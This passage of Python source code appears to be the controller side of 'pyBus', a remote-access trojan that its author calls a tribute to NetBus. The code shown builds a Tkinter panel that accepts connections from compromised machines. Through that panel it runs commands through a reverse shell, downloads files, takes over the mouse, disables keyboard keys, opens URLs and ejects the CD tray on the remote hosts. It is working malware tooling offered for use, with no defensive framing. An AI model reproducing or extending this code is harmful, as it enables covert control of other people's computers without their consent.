                            print(len(result),'<',len_result)

                        with open(os.path.split(FILE)[1].decode().replace('?', ' '), 'wb') as down_file:
                            down_file.write(result)
                        
                        T.config(state=DISABLED)
   
                    else:
                        self.action(b'reverse_shell')
                        self.action(command.encode())
                                
                        var = self.statusbar['text']
                        current_IP = var[13: var.find('ID:')].rstrip()
                        current_ID = var[var.find('ID:'):]
                        current_socket = clients[(current_IP,current_ID)]

                        len_result = int(current_socket.recv(1024))
                        result = current_socket.recv(len_result)
                        result2 = pickle.loads(result)
                                    
                        T.insert(END, result2)
                        T.config(state=DISABLED)

                except:
                    self.reverse_shell.destroy()
                

            self.reverse_shell_entry.bind('<Return>', get)

    def control_mouse(self):
        self.buttonID['Control Mouse'].focus_set()

        if self.statusbar['text'] != 'No connection':

            if self.buttonID['Control Mouse']['text'] == 'Control Mouse':
                self.buttonID['Control Mouse']['text'] = 'Stop Control'

                def motion(event):
                    x = root.winfo_pointerx()
                    y = root.winfo_pointery()
                    self.entry1.delete(0,END)
                    self.entry1.insert(0, x)
                    self.entry2.delete(0,END)
                    self.entry2.insert(0, y)
                    mouse_pos = self.entry1.get()+';'+self.entry2.get()+'@'

                    try:
                        self.action(b'control_mouse')                    
                        self.action(mouse_pos.encode()+ b'0000000000')
                    except:
                        root.bind('<Motion>', self.control_mouse_nothing)

                root.bind('<Motion>', motion)

            elif self.buttonID['Control Mouse']['text'] == 'Stop Control':
                self.buttonID['Control Mouse']['text'] = 'Control Mouse'
                root.bind('<Motion>', self.control_mouse_nothing)

    def control_mouse_nothing(self,event):
        pass
                
    def go_to_url(self):
        self.buttonID['Go to URL'].focus_set()

        font = ('MS Sans Serif', 8)
        if self.statusbar['text'] != 'No connection':
            self.go_to_url = create_window('URL')
            center_window(self.go_to_url, 270, 100)

            self.label = Label(self.go_to_url, text='URL to go to:',
                                           font=font)
            self.label.pack(padx=10, pady=10, anchor='w')

            self.go_to_url_entry = Entry(self.go_to_url, width='40', font=font)

            self.go_to_url_entry.insert(0, var['go_to_url'])
            self.go_to_url_entry.pack()

            self.frame = Frame(self.go_to_url)
            self.frame.pack(pady='10')

            button = Button(self.frame, text='OK', font=font, width='10', height=1, command=self.go_to_url_go_to_url)
            button.pack(side='left', padx='5')
            

            button = Button(self.frame, text='Cancel', font=font, width='10',
                                        height=1)
            button['command'] = functools.partial(self.destroy, self.go_to_url)
            button.pack(padx='5')

    def go_to_url_go_to_url(self):
        try:
            self.action(b'go_to_url')
            self.action( self.go_to_url_entry.get().encode())
        except:
            pass
        finally:
            var['go_to_url'] = self.go_to_url_entry.get()
            self.go_to_url.destroy()

    def key_manager(self):
        self.buttonID['Key manager'].focus_set()

        if self.statusbar['text'] != 'No connection':
            self.key_manager = create_window('Keyboard')
            center_window(self.key_manager, 120, 80)

            self.key_manager_disable_keys_button = Button(self.key_manager, text='Disable keys', font=self.font,
                            width='14', height=1, command=self.key_manager_disable_keys)
            self.key_manager_disable_keys_button.pack(pady='10')
            

            self.key_manager_disable_all_keys_button = Button(self.key_manager, text='Disable all keys', font=self.font,
                            width='14', height=1, command=self.key_manager_disable_all_keys)
            self.key_manager_disable_all_keys_button.pack()

    def key_manager_disable_keys(self):

        if self.key_manager_disable_keys_button['text'] == 'Disable keys':

            font = ('MS Sans Serif', 8)
            
            self.key_manager_disable_keys_window = create_window('Keys')
            center_window(self.key_manager_disable_keys_window, 270, 100)

            self.label = Label(self.key_manager_disable_keys_window,
                               text='Disable which keys (type all in sequence)?', font=font)
            self.label.pack(padx=10, pady=10, anchor='w')

            self.key_manager_disable_keys_window_entry = Entry(self.key_manager_disable_keys_window, width='40', font=font)

            self.key_manager_disable_keys_window_entry.insert(0, var['disable_keys'])
            self.key_manager_disable_keys_window_entry.pack()

            self.frame = Frame(self.key_manager_disable_keys_window)
            self.frame.pack(pady='10')

            button = Button(self.frame, text='OK', font=font, width='10', height=1, command=self.key_manager_disable_keys2)
            button.pack(side='left', padx='5')

            button = Button(self.frame, text='Cancel', font=font, width='10',
                                            height=1)
            button['command'] = functools.partial(self.destroy, self.key_manager_disable_keys_window)
            button.pack(padx='5')

        elif self.key_manager_disable_keys_button['text'] == 'Restore keys':
            self.key_manager_disable_keys_button['text'] = 'Disable keys'
            try:
                self.action(b'enable_keys')
                self.action(b'pyBus')
            except:
                self.key_manager.destroy()

    def key_manager_disable_keys2(self):
        var['disable_keys'] = self.key_manager_disable_keys_window_entry.get()
        self.key_manager_disable_keys_button['text'] = 'Restore keys'
        self.key_manager.grab_set()
        try:
            self.action(b'disable_keys')
            self.action(var['disable_keys'].encode())
        except:
             self.key_manager.destroy()
        finally:
            self.key_manager_disable_keys_window.destroy()

    def key_manager_disable_all_keys(self):
        if self.key_manager_disable_all_keys_button['text'] == 'Disable all keys':
            self.key_manager_disable_all_keys_button['text'] = 'Enable all keys'
            try:
                self.action(b'disable_all_keys')
                self.action(b'pyBus')
            except:
                 self.key_manager.destroy()

        elif self.key_manager_disable_all_keys_button['text'] == 'Enable all keys':
            self.key_manager_disable_all_keys_button['text'] = 'Disable all keys'
            try:
                self.action(b'enable_all_keys')
                self.action(b'pyBus')
            except:
                 self.key_manager.destroy()


    def file_manager(self):
        self.buttonID['File Manager'].focus_set()
        if self.statusbar['text'] != 'No connection':
            messagebox.showinfo('Info', 'Implemented in "Reverse shell" function ')

    def waiting_for_connections(self):
        self.buttonID['Waiting for connections'].focus_set()
        
        try:
            self.waiting_for_connections.focus_set()
        except:
            self.waiting_for_connections = create_window('Waiting for connections')
            self.waiting_for_connections.resizable('False', 'False')
            self.waiting_for_connections.protocol("WM_DELETE_WINDOW", self.close_window)
            screen_width = root.winfo_screenwidth()
            screen_height = root.winfo_screenheight()
            width = 200
            height = 500

            x = screen_width/2 - 500
            y = (screen_height/2) - (height/2)
            self.waiting_for_connections.geometry('%dx%d+%d+%d' % (width, height, x, y))

            self.waiting_for_connections_frame = Frame(self.waiting_for_connections)
            self.waiting_for_connections_frame.pack()

            self.waiting_for_connections_refresh = Button(self.waiting_for_connections_frame, text='Refresh', command=self.refresh)
            self.waiting_for_connections_refresh.pack(pady=10, side='left')
            
            self.waiting_for_connections_button = Button(self.waiting_for_connections_frame, text='Connect', command=self.connect)
            self.waiting_for_connections_button.pack(pady=10, padx=10)

            self.waiting_for_connections_frame2 = Frame(self.waiting_for_connections)
            self.waiting_for_connections_frame2.pack()

            self.listbox = Listbox(self.waiting_for_connections_frame2, width=30, height=28)
            self.listbox.pack()
            
            s = tkinter.ttk.Scrollbar(self.waiting_for_connections_frame2, orient=VERTICAL, command=self.listbox.yview)
            s.place(x=166, y=2, height=449)
            self.listbox['yscrollcommand'] = s.set

            # Start server socket
            threading.Thread(target=self.start_socket).start()

               
    def start_socket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('', int(self.port.get())))
        sock.listen(10)

        while True:
            client_socket, client_addr = sock.accept()
            clients[(client_addr[0], "ID: %s" %random.random())] = client_socket
                  
    def connect(self):
        try:
            if self.waiting_for_connections_button['text'] == 'Connect':
                self.statusbar['text'] = 'Connected to %s' %self.listbox.get(self.listbox.curselection())
                self.waiting_for_connections_button['text'] = 'Disconnect'

            elif self.waiting_for_connections_button['text'] == 'Disconnect':

                #Restore Everything to orignal states
                self.buttonID['Open CD-ROM']['text'] = 'Open CD-ROM'
                self.action(b'closeCD')
                self.buttonID['Show image']['text'] = 'Show image'
                self.action(b'removeimage')
                self.buttonID['Control Mouse']['text'] = 'Control Mouse'
                self.statusbar['text'] = 'No connection'
                self.waiting_for_connections_button['text'] = 'Connect'

                self.action(b'0'*1024)

        except:
            pass

        
    def refresh(self):
        self.listbox.delete(0,END)
        for x in clients:
            try:
                clients[x].send(b'0'*1024)
                
                self.listbox.insert(END, "{0:18}{1}".format(x[0], x[1]))

            except:
                clients[x].close()
                remove_IP = list(clients.keys()).index(x)
                self.listbox.delete(remove_IP)
                del clients[x]

                #Restore Everything to orignal states
                self.buttonID['Open CD-ROM']['text'] = 'Open CD-ROM'
                self.buttonID['Show image']['text'] = 'Show image'
                
                self.buttonID['Control Mouse']['text'] = 'Control Mouse'
                self.statusbar['text'] = 'No connection'
                self.waiting_for_connections_button['text'] = 'Connect'
                self.statusbar['text'] = 'No connection'
                self.waiting_for_connections_button['text'] = 'Connect'

    def close_window(self):
        messagebox.showerror('Error','Close window is not possible')        

    def about(self):
        self.buttonID['About'].focus_set()
        about = create_window('About pyBus')
        center_window(about, 270, 120)
        font1 = ('Arial', 10, 'bold')
        font2 = ('MS Sans Serif', 10)
        Label(about, text='\nBased on Netbus 1.70', font=font1).pack()
        Label(about, text='pyBus is my tribute for NetBus.', font=font2).pack()
        button = Button(about, text='Enjoy', font=self.font, width=7)
        button['command'] = functools.partial(self.destroy, about)
        button.pack(pady=20)

    def destroy(self, toplevel_name):
        toplevel_name.destroy()


def create_window(title):
    top = Toplevel()
    top.title(title)
    top.transient(root)
    top.focus_set()
    if title == 'Waiting for connections':
        return top
    top.grab_set()
    return top

def center_window(window, width, height):
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    x = (screen_width/2) - (width/2)
    y = (screen_height/2) - (height/2)
    window.geometry('%dx%d+%d+%d' % (width, height, x, y))
    window.resizable('False', 'False')

def killall():
    messagebox.showinfo('Info', 'Closing all active socket, please wait')
    for x in clients:
        try:
            clients[x].send(b'kill')
        except:
            pass
        finally:
            clients[x].close()
        
    root.destroy()
 
var = {'show_image': '',
       'start_program':'',
       'msg_manager': 'Surprise!',
       'play_sound': '',
       'send_text': '',
       'go_to_url': 'http://',
       'disable_keys': '',
       'change_wallpaper': ''}

clients = collections.OrderedDict()

root = Tk()
root.title('pyBus 1.70, by Daniel Moreno')
center_window(root, 500, 270)
root.protocol("WM_DELETE_WINDOW", killall)
Application(root)

root.mainloop()
os.kill(os.getpid(), signal.SIGTERM)
